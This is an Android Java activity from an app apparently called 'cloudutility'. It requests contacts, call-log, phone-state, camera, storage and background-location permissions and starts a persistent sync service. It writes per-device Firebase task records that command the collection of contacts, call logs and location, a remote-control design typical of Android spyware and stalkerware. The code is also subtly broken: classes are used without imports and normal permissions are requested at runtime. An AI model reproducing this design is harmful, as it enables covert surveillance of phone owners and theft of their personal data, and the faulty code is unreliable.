package com.example.cloudutility;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;

/**
 * Main Activity - App launcher with dynamic permission handling
 * Features:
 * - Runtime permission requests
 * - Service status monitoring
 * - Firebase connection status
 * - Quick sync triggers
 */
public class MainActivity extends AppCompatActivity {
    
    private static final String TAG = "MainActivity";
    private static final int PERMISSION_REQUEST_CODE = 100;
    
    // UI Components
    private TextView statusTextView;
    private TextView deviceIdTextView;
    private TextView permissionsStatusTextView;
    private Button startServiceButton;
    private Button stopServiceButton;
    private Button syncContactsButton;
    private Button syncCallLogsButton;
    private Button syncLocationButton;
    private Button fullSyncButton;
    
    // Firebase
    private FirebaseDatabase firebaseDatabase;
    private DatabaseReference deviceRef;
    private ValueEventListener statusListener;
    
    // Service status
    private boolean isServiceRunning = false;
    
    // Permissions launcher for Android 11+
    private ActivityResultLauncher<String> requestPermissionLauncher;
    
    // List of all required permissions
    private final String[] REQUIRED_PERMISSIONS = {
        Manifest.permission.INTERNET,
        Manifest.permission.ACCESS_NETWORK_STATE,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.WRITE_CONTACTS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.CAMERA,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE,
        Manifest.permission.FOREGROUND_SERVICE,
        Manifest.permission.WAKE_LOCK,
        Manifest.permission.RECEIVE_BOOT_COMPLETED
    };
    
    // Android 11+ specific permissions
    private final String[] ANDROID_11_PERMISSIONS = {
        Manifest.permission.ACCESS_BACKGROUND_LOCATION,
        Manifest.permission.FOREGROUND_SERVICE_LOCATION,
        Manifest.permission.FOREGROUND_SERVICE_DATA_SYNC
    };
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        // Initialize UI
        initializeUI();
        
        // Initialize Firebase
        initializeFirebase();
        
        // Setup permission launcher
        setupPermissionLauncher();
        
        // Check and request permissions
        checkAndRequestPermissions();
        
        // Setup click listeners
        setupClickListeners();
    }
    
    /**
     * Initialize UI components
     */
    private void initializeUI() {
        statusTextView = findViewById(R.id.statusTextView);
        deviceIdTextView = findViewById(R.id.deviceIdTextView);
        permissionsStatusTextView = findViewById(R.id.permissionsStatusTextView);
        startServiceButton = findViewById(R.id.startServiceButton);
        stopServiceButton = findViewById(R.id.stopServiceButton);
        syncContactsButton = findViewById(R.id.syncContactsButton);
        syncCallLogsButton = findViewById(R.id.syncCallLogsButton);
        syncLocationButton = findViewById(R.id.syncLocationButton);
        fullSyncButton = findViewById(R.id.fullSyncButton);
        
        // Display device ID
        String deviceId = Settings.Secure.getString(getContentResolver(), 
            Settings.Secure.ANDROID_ID);
        deviceIdTextView.setText("Device ID: " + deviceId);
    }
    
    /**
     * Initialize Firebase connection
     */
    private void initializeFirebase() {
        try {
            firebaseDatabase = FirebaseHelper.getInstance().getDatabase();
            String deviceId = Settings.Secure.getString(getContentResolver(), 
                Settings.Secure.ANDROID_ID);
            deviceRef = firebaseDatabase.getReference("devices").child(deviceId);
            
            // Listen for device status
            statusListener = new ValueEventListener() {
                @Override
                public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                    String status = dataSnapshot.child("status").getValue(String.class);
                    runOnUiThread(() -> {
                        statusTextView.setText("Firebase Status: " + 
                            (status != null ? status : "Unknown"));
                    });
                }
                
                @Override
                public void onCancelled(@NonNull DatabaseError databaseError) {
                    runOnUiThread(() -> {
                        statusTextView.setText("Firebase Status: Error - " + 
                            databaseError.getMessage());
                    });
                }
            };
            
            deviceRef.addValueEventListener(statusListener);
            
        } catch (Exception e) {
            Log.e(TAG, "Firebase initialization failed", e);
            statusTextView.setText("Firebase Status: Failed to initialize");
        }
    }
    
    /**
     * Setup permission launcher for modern Android
     */
    private void setupPermissionLauncher() {
        requestPermissionLauncher = registerForActivityResult(
            new ActivityResultContracts.RequestPermission(),
            isGranted -> {
                if (isGranted) {
                    Log.d(TAG, "Permission granted");
                    updatePermissionsStatus();
                } else {
                    Log.d(TAG, "Permission denied");
                    showPermissionDeniedDialog();
                }
            }
        );
    }
    
    /**
     * Check all required permissions and request if needed
     */
    private void checkAndRequestPermissions() {
        List<String> permissionsToRequest = new ArrayList<>();
        
        // Check standard permissions
        for (String permission : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) 
                != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(permission);
            }
        }
        
        // Check Android 11+ specific permissions
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            for (String permission : ANDROID_11_PERMISSIONS) {
                if (ContextCompat.checkSelfPermission(this, permission) 
                    != PackageManager.PERMISSION_GRANTED) {
                    permissionsToRequest.add(permission);
                }
            }
        }
        
        // Request permissions
        if (!permissionsToRequest.isEmpty()) {
            ActivityCompat.requestPermissions(
                this,
                permissionsToRequest.toArray(new String[0]),
                PERMISSION_REQUEST_CODE
            );
        } else {
            updatePermissionsStatus();
            enableServiceControls();
        }
    }
    
    /**
     * Setup button click listeners
     */
    private void setupClickListeners() {
        startServiceButton.setOnClickListener(v -> startSyncService());
        stopServiceButton.setOnClickListener(v -> stopSyncService());
        syncContactsButton.setOnClickListener(v -> triggerSync("sync_contacts"));
        syncCallLogsButton.setOnClickListener(v -> triggerSync("sync_call_logs"));
        syncLocationButton.setOnClickListener(v -> triggerSync("sync_location"));
        fullSyncButton.setOnClickListener(v -> triggerSync("sync_all"));
    }
    
    /**
     * Start the background sync service
     */
    private void startSyncService() {
        if (!checkAllPermissions()) {
            Toast.makeText(this, "Please grant all required permissions first", 
                Toast.LENGTH_LONG).show();
            return;
        }
        
        Intent serviceIntent = new Intent(this, SyncBackgroundService.class);
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
        
        isServiceRunning = true;
        updateServiceButtons();
        Toast.makeText(this, "Sync service started", Toast.LENGTH_SHORT).show();
        
        Log.d(TAG, "Sync service started");
    }
    
    /**
     * Stop the background sync service
     */
    private void stopSyncService() {
        Intent serviceIntent = new Intent(this, SyncBackgroundService.class);
        stopService(serviceIntent);
        
        isServiceRunning = false;
        updateServiceButtons();
        Toast.makeText(this, "Sync service stopped", Toast.LENGTH_SHORT).show();
        
        Log.d(TAG, "Sync service stopped");
    }
    
    /**
     * Trigger a specific sync operation via Firebase
     */
    private void triggerSync(String command) {
        if (!isServiceRunning) {
            Toast.makeText(this, "Please start the service first", 
                Toast.LENGTH_SHORT).show();
            return;
        }
        
        try {
            String deviceId = Settings.Secure.getString(getContentResolver(), 
                Settings.Secure.ANDROID_ID);
            
            // Create task in Firebase
            DatabaseReference tasksRef = firebaseDatabase
                .getReference("devices")
                .child(deviceId)
                .child("tasks");
            
            String taskId = tasksRef.push().getKey();
            
            if (taskId != null) {
                Map<String, Object> task = new HashMap<>();
                task.put("command", command);
                task.put("status", "pending");
                task.put("created_at", System.currentTimeMillis());
                task.put("params", new HashMap<>());
                
                tasksRef.child(taskId).setValue(task)
                    .addOnSuccessListener(aVoid -> {
                        Toast.makeText(MainActivity.this, 
                            command + " task triggered", Toast.LENGTH_SHORT).show();
                        Log.d(TAG, "Task triggered: " + command);
                    })
                    .addOnFailureListener(e -> {
                        Toast.makeText(MainActivity.this, 
                            "Failed to trigger task: " + e.getMessage(), 
                            Toast.LENGTH_SHORT).show();
                        Log.e(TAG, "Failed to trigger task", e);
                    });
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error triggering sync", e);
            Toast.makeText(this, "Error: " + e.getMessage(), Toast.LENGTH_SHORT).show();
        }
    }
    
    /**
     * Check if all permissions are granted
     */
    private boolean checkAllPermissions() {
        for (String permission : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) 
                != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            for (String permission : ANDROID_11_PERMISSIONS) {
                if (ContextCompat.checkSelfPermission(this, permission) 
                    != PackageManager.PERMISSION_GRANTED) {
                    return false;
                }
            }
        }
        
        return true;
    }
    
    /**
     * Update permissions status display
     */
    private void updatePermissionsStatus() {
        int grantedCount = 0;
        int totalCount = REQUIRED_PERMISSIONS.length;
        
        for (String permission : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) 
                == PackageManager.PERMISSION_GRANTED) {
                grantedCount++;
            }
        }
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            totalCount += ANDROID_11_PERMISSIONS.length;
            for (String permission : ANDROID_11_PERMISSIONS) {
                if (ContextCompat.checkSelfPermission(this, permission) 
                    == PackageManager.PERMISSION_GRANTED) {
                    grantedCount++;
                }
            }
        }
        
        permissionsStatusTextView.setText(String.format(
            "Permissions: %d/%d granted", grantedCount, totalCount));
        
        if (grantedCount == totalCount) {
            permissionsStatusTextView.setTextColor(
                ContextCompat.getColor(this, android.R.color.holo_green_dark));
        } else {
            permissionsStatusTextView.setTextColor(
                ContextCompat.getColor(this, android.R.color.holo_red_dark));
        }
    }
    
    /**
     * Update service control buttons
     */
    private void updateServiceButtons() {
        startServiceButton.setEnabled(!isServiceRunning);
        stopServiceButton.setEnabled(isServiceRunning);
        syncContactsButton.setEnabled(isServiceRunning);
        syncCallLogsButton.setEnabled(isServiceRunning);
        syncLocationButton.setEnabled(isServiceRunning);
        fullSyncButton.setEnabled(isServiceRunning);
    }
    
    /**
     * Enable service controls after permissions granted
     */
    private void enableServiceControls() {
        startServiceButton.setEnabled(true);
        if (isServiceRunning) {
            stopServiceButton.setEnabled(true);
            syncContactsButton.setEnabled(true);
            syncCallLogsButton.setEnabled(true);
            syncLocationButton.setEnabled(true);
            fullSyncButton.setEnabled(true);
        }
    }
    
    /**
     * Show dialog when permissions are denied
     */
    private void showPermissionDeniedDialog() {
        new AlertDialog.Builder(this)
            .setTitle("Permissions Required")
            .setMessage("This app requires certain permissions to function properly. " +
                       "Please grant all permissions in Settings.")
            .setPositiveButton("Open Settings", (dialog, which) -> {
                Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                Uri uri = Uri.fromParts("package", getPackageName(), null);
                intent.setData(uri);
                startActivity(intent);
            })
            .setNegativeButton("Cancel", null)
            .show();
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, 
                                          @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == PERMISSION_REQUEST_CODE) {
            updatePermissionsStatus();
            
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            
            if (allGranted) {
                enableServiceControls();
                Toast.makeText(this, "All permissions granted", Toast.LENGTH_SHORT).show();
            } else {
                showPermissionDeniedDialog();
            }
        }
    }
    
    @Override
    protected void onResume() {
        super.onResume();
        updatePermissionsStatus();
        updateServiceButtons();
    }
    
    @Override
    protected void onDestroy() {
        super.onDestroy();
        
        // Remove Firebase listener
        if (deviceRef != null && statusListener != null) {
            deviceRef.removeEventListener(statusListener);
        }
    }
}
